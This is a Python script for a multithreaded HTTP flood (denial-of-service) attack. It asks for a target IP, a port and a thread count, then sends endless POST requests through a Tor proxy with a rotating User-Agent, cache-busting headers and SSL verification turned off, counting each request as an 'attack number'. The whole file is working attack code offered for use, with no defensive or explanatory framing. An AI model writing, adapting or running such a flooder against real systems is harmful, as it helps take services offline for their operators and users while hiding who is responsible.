import requests
import threading
import random
import urllib3
import os  # Import os module for clearing the terminal
import time

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize the attack counter and threading lock
attack_num = 0
lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/102.0",
]

def get_tor_session():
    """
    Returns a session configured to use Tor via a SOCKS5 proxy with a randomized User-Agent and cache-busting headers.
    """
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    session.headers.update({
        "User-Agent": random.choice(USER_AGENTS),  # Randomize User-Agent
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.google.com/",
        "DNT": "1",  # Do Not Track
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache, no-store, must-revalidate",  # Cache-busting header
        "Pragma": "no-cache",
        "Expires": "0"
    })
    return session

session = get_tor_session()

target = str(input("Insert target’s IP: "))
port = int(input("Insert Port: "))
Trd = int(input("Insert number of Threads: "))

# Define a random fake IP address to use in requests
fake_ip = get_tor_session().get('https://api.ipify.org?format=json').json()['ip']

# def clear_screen():
#     """ Clears the terminal screen. """
#     if os.name == 'nt':  # For Windows
#         os.system('cls')
#     else:  # For Linux/Mac
#         os.system('clear')

def test():
    global attack_num
    while True:
        try:
            # Clear the terminal screen at the beginning of each iteration
            # clear_screen()

            # Construct the URL
            url = f"https://{target}:{port}/"  # Adjust to use the correct protocol (HTTP/HTTPS)

            # Send the HTTP GET request through Tor, disabling SSL verification
            response = session.post(url, headers={"Host": fake_ip}, verify=False)

            # Print the response status code
            print(f"Request sent to {url}. Status Code: {response.status_code}")
            print(f"Response Headers: {response.headers}")
            print(f"Response Body: {response.text}") 
            
            # Lock the access to the global variable `attack_num`
            with lock:
                attack_num += 1
                print(f"Attack number: {attack_num}")  # Print attack number
                # time.sleep(1)

        except Exception as e:
            print(f"Error: {e}")
            continue

# Create and start threadsåå
threads = []
for i in range(Trd):
    thread = threading.Thread(target=test)
    thread.start()
    threads.append(thread)

# Join the threads (This ensures the main thread waits for them to finish, which never happens in this infinite loop)
for thread in threads:
    thread.join()
